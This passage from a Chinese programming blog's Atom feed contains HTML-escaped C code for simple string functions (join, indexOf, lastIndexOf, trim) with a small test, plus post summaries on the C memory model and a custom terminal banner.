class=&quot;comment&quot;&gt;///方法定义&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;  *s1,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *s2)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str1,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str2)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;lastIndexOf&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str1,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str2)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;ltrim&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;rtrim&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//测试数据准备&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *first;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *second;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *indexstr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *third;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *show;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    first = &lt;span class=&quot;string&quot;&gt;&quot;binyanbin website is &quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    second = &lt;span class=&quot;string&quot;&gt;&quot;http://binyanbin.github.io&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    indexstr = &lt;span class=&quot;string&quot;&gt;&quot;bin&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    third = &lt;span class=&quot;string&quot;&gt;&quot;  binyanbin trim test &quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//测试结果输出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    show = join(first,second);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;join(\&quot;%s\&quot;,\&quot;%s\&quot;)=\&quot;%s\&quot;\n&quot;&lt;/span&gt;,first,second,show);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;free&lt;/span&gt;(show);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;indexOf(\&quot;%s\&quot;,\&quot;%s\&quot;)=%d\n&quot;&lt;/span&gt;,second,indexstr,indexOf(second,indexstr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;lastIndexOf(\&quot;%s\&quot;,\&quot;%s\&quot;)=%d\n&quot;&lt;/span&gt;,second,indexstr,lastIndexOf(second,indexstr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    show = ltrim(third);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;ltrim(\&quot;%s\&quot;)=\&quot;%s\&quot;\n&quot;&lt;/span&gt;,third,show);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;free&lt;/span&gt;(show);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    show = rtrim(third);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;rtrim(\&quot;%s\&quot;)=\&quot;%s\&quot;\n&quot;&lt;/span&gt;,third,show);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    show = trim(third);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;trim(\&quot;%s\&quot;)=\&quot;%s\&quot;&quot;&lt;/span&gt;,third,show);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;free&lt;/span&gt;(show);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//字符串连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;  *s1,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *s2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//分布内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *result = &lt;span class=&quot;built_in&quot;&gt;malloc&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(s1)+&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(s2)+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (result==&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;//内存为空退出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//拷贝s1到result&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcpy&lt;/span&gt;(result, s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//s2加到result尾部  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcat&lt;/span&gt;(result, s2);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//字符串查询最开始位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str1,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str2)&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *p=str1;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//p是一个地址，找到相同字符串的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    p=&lt;span class=&quot;built_in&quot;&gt;strstr&lt;/span&gt;(str1,str2);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(p==&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//是不是同一个地址了，是同一地址则找到字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(str1!=p)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            str1++;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            i++;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; i;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//查询最后位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;lastIndexOf&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str1,&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str2)&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *p=str1;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; len=&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(str2);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    p=&lt;span class=&quot;built_in&quot;&gt;strstr&lt;/span&gt;(str1,str2);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(p==&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//未找到字符串地址为空则跳出循环  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(p!=&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//跳过已找的地址 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(;str1!=p;str1++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            i++;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        p=p+len;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//找出下一个同样字符串的地址  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        p=&lt;span class=&quot;built_in&quot;&gt;strstr&lt;/span&gt;(p,str2);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; i;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//删除左空格 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;ltrim&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *param)&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//申请存储，不修改参数内存的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str = &lt;span class=&quot;built_in&quot;&gt;malloc&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(param)+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcpy&lt;/span&gt;(str, param); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,j,len=&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(str);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(str[i]!=&lt;span class=&quot;string&quot;&gt;&#39;\0&#39;&lt;/span&gt;)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//32:空格,9:横向制表符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(str[i]!=&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;&amp;amp;&amp;amp;str[i]!=&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        i++;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(i!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//将后面的字符顺势前移,补充删掉的空白位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(j=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j&amp;lt;=len-i;j++)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        str[j]=str[j+i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; str; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//删除右空格&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;rtrim&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *param)&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str = &lt;span class=&quot;built_in&quot;&gt;malloc&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(param)+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcpy&lt;/span&gt;(str, param); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *p=str;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(str)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(i&amp;gt;=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(p[i]!=&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;&amp;amp;&amp;amp;p[i]!=&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        i--;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    str[++i]=&lt;span class=&quot;string&quot;&gt;&#39;\0&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; str;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//删除左右空格&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *str)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* temp = ltrim(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* result = rtrim(temp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;free&lt;/span&gt;(temp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;说起内存模型，那就先要介绍程序运行时是如何管理内存的。&lt;br&gt;程序运行时:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统先把物理硬盘代码load到内存&lt;/li&gt;
&lt;li&gt;系统再把c代码分成四个区&lt;/li&gt;
&lt;li&gt;系统再找到main函数入口执行&lt;h2 id=&quot;程序的四区模型&quot;&gt;&lt;a href=&quot;#程序的四区模型&quot; class=&quot;headerlink&quot; title=&quot;程序的四区模型&quot;&gt;&lt;/a&gt;程序的四区模型&lt;/h2&gt;&lt;img src=&quot;/img/c-3.png&quot; alt=&quot;效果&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言之个性化termial</title>
    <link href="http://binyanbin.github.io/2016/03/24/c-2/"/>
    <id>http://binyanbin.github.io/2016/03/24/c-2/</id>
    <published>2016-03-23T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;很多牛人有自己的个性化的命令行，为什么我没有呢?晚上我就写了一个。效果如下:&lt;br&gt;&lt;img src=&quot;/img/c-1.png&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;图形实现&quot;&gt;&lt;a href=&quot;#图形实现&quot; class=&quot;headerlink&quot; title=&quot;图形实现&quot;&gt;&lt;/a&gt;图形实现&lt;/h2&gt;&lt;p&gt;图形是使用C打出来的，就当练手。&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span 